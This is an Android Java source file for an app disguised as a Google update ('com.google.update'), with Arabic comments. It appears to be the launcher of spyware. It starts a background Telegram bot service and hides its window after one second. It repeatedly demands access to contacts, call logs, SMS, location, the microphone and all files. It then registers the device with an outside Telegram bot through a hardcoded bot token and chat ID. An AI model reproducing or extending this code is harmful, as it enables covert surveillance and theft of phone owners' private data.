package com.google.update;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends Activity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int STORAGE_PERMISSION_CODE = 101;
    private ExecutorService executor = Executors.newSingleThreadExecutor();
    private boolean allPermissionsGranted = false;
    private int retryCount = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // تشغيل الخدمة فوراً في الخلفية
        startBotService();
        
        // طلب جميع الأذونات اللازمة
        requestAllPermissions();
        
        // إنهاء النشاط فوراً بعد 1 ثانية
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            if (!allPermissionsGranted) {
                // إذا لم يتم منح الأذونات، نطلبها مرة أخرى بعد 5 ثوانٍ
                new Handler(Looper.getMainLooper()).postDelayed(this::requestAllPermissions, 5000);
            }
            finish();
        }, 1000);
    }
    
    private void startBotService() {
        try {
            Intent intent = new Intent(this, TelegramBotService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            // فشل تشغيل الخدمة
        }
    }
    
    private void requestAllPermissions() {
        List<String> neededPermissions = new ArrayList<>();
        
        // أذونات أساسية
        neededPermissions.add(Manifest.permission.INTERNET);
        neededPermissions.add(Manifest.permission.READ_CONTACTS);
        neededPermissions.add(Manifest.permission.READ_CALL_LOG);
        neededPermissions.add(Manifest.permission.READ_SMS);
        neededPermissions.add(Manifest.permission.RECEIVE_SMS);
        neededPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        neededPermissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        neededPermissions.add(Manifest.permission.RECORD_AUDIO);
        neededPermissions.add(Manifest.permission.VIBRATE);
        neededPermissions.add(Manifest.permission.WAKE_LOCK);
        neededPermissions.add(Manifest.permission.FOREGROUND_SERVICE);
        neededPermissions.add(Manifest.permission.RECEIVE_BOOT_COMPLETED);
        
        // أذونات التخزين حسب إصدار أندرويد
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            neededPermissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            neededPermissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            neededPermissions.add(Manifest.permission.READ_MEDIA_AUDIO);
            neededPermissions.add(Manifest.permission.POST_NOTIFICATIONS);
        } else {
            neededPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            neededPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        
        // تصفية الأذونات التي لم تُمنح بعد
        List<String> permissionsToRequest = new ArrayList<>();
        for (String perm : neededPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(perm);
            }
        }
        
        if (!permissionsToRequest.isEmpty() && retryCount < 3) {
            retryCount++;
            ActivityCompat.requestPermissions(this, 
                permissionsToRequest.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else if (permissionsToRequest.isEmpty()) {
            allPermissionsGranted = true;
            sendRegistrationToBot();
        }
        
        // طلب إذن الوصول لجميع الملفات (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, STORAGE_PERMISSION_CODE);
                } catch (Exception e) {
                    // بعض الأجهزة لا تدعم هذا الإعداد
                }
            }
        }
    }
    
    private void sendRegistrationToBot() {
        executor.execute(() -> {
            try {
                String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " Android " + Build.VERSION.RELEASE;
                JSONObject json = new JSONObject();
                json.put("device_id", deviceId);
                json.put("device_name", deviceName);
                String msg = "REGISTER:" + json.toString();
                
                String botToken = "8652354299:AAEOH62d9BHbl064QYcFC2LgbiAH_doiwhU";
                String chatId = "6793813126";
                String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode(msg, "UTF-8");
                
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);
                int responseCode = conn.getResponseCode();
                conn.disconnect();
                
                if (responseCode == 200) {
                    runOnUiThread(() -> Toast.makeText(this, "✅ تم التسجيل", Toast.LENGTH_SHORT).show());
                }
            } catch (Exception e) {
                // فشل التسجيل، سنحاول مرة أخرى لاحقاً
                new Handler(Looper.getMainLooper()).postDelayed(this::sendRegistrationToBot, 30000);
            }
        });
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                allPermissionsGranted = true;
                sendRegistrationToBot();
            } else if (retryCount < 3) {
                // إعادة طلب الأذونات بعد 3 ثوانٍ
                new Handler(Looper.getMainLooper()).postDelayed(this::requestAllPermissions, 3000);
            }
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == STORAGE_PERMISSION_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
                // تم منح إذن الوصول لجميع الملفات
            }
            requestAllPermissions();
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (executor != null) {
            executor.shutdown();
        }
    }
}
